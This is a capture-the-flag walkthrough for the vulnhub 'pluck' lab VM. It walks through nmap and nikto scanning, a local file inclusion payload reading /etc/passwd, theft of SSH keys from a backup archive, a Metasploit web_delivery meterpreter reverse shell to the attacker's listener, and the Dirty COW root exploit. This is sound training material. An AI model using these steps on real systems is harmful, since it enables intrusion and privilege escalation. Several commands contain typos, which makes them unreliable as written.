@@ -1,0 +1,70 @@
+
+Hack the Pluck VM (CTF Challenge)
+
+Coming towards another tutorial of vulnhub’s lab challenges “pluck” you can download it from here.
+This lab is quite simple this article may help you to solve the task for capturing the flag.
+LET’S START!!!
+192.168.1.115 is my target IP let enumerate through aggressive scan using NMAP. You can observe its result from given screenshot.
+nmap -p- -A 192.168.1.115
+
+Use nikto to dig up more information related to target
+nikto -h http://192.168.1.115
+ Finally I have got something very remarkable here if you notice the given below image the highlighted text looks like local file inclusion vulnerability.
+
+So when I explore the above highlighted text in the browser here I got more than enough data. The highlighted text denotes towards some kind of backup script file path.
+ http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd
+
+When again I walk around it now further I found a tar file for backup.
+ http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh
+
+Download tar file of backup script, type following command inside the terminal of your kali Linux.
+Wget http://192.168.1.115/index.php?page=/backups/backup.tar
+
+Now type following command to extract backup.tar file
+Tar –xvf index.php\?page\=%2Fbackups%2Fbackup.tar
+Inside it I found home folder which further contains sub folder for 3 users.
+
+Among all 3 users only paul has keys
+cd paul
+ls 
+cd keys
+ls
+So here I found 6 keys, let use one of them for connection.
+
+Ssh -I id_key4 paul@192.168.1.115
+
+When you will try to connect with target using ssh simultaneously a new terminal “Pdmenu” will pop up. Here I got so many option but I choose Edit file option that gave me a prompt to edit any file and it look like command injection vulnerability.
+
+Now load metasploit framework and type following
+Msfconsole
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)>set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)>set lhost 192.168.1.15 (IP of Local Host)
+msf exploit (web_delivery)>set lport 4444
+msf exploit (web_delivery)>set svrport 8081
+msf exploit (web_delivery)>exploit
+Now copy the generated command php….5tz’));” and send it to target
+
+Now paste above command as shown in the screenshot and hit enter which will give you reverse connection at the background inside metasploit.
+
+Great!!! We have got victim’s meterpreter session
+Meterpreter>shell
+
+Uname -a
+ Now use Dirtycow exploit
+Here got the path to download exploit which might be related to it.
+
+Open this path “http://www.exploit-db.com/download/40616” in browser and downloads the exploit for dirty cow vulnerability. I have saved this exploit as raj.
+
+Now type following command to compile your exploit so that it can run successfully inside your Kali Linux.
+gcc shell.c –o raj -pthread
+
+Now we can run our exploit to achieve root permission and try to capture the flag
+./raj
+cd /root
+ls
+Cat flag.txt
+ Bravo!!! We have captured the flag an beat this task………..
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
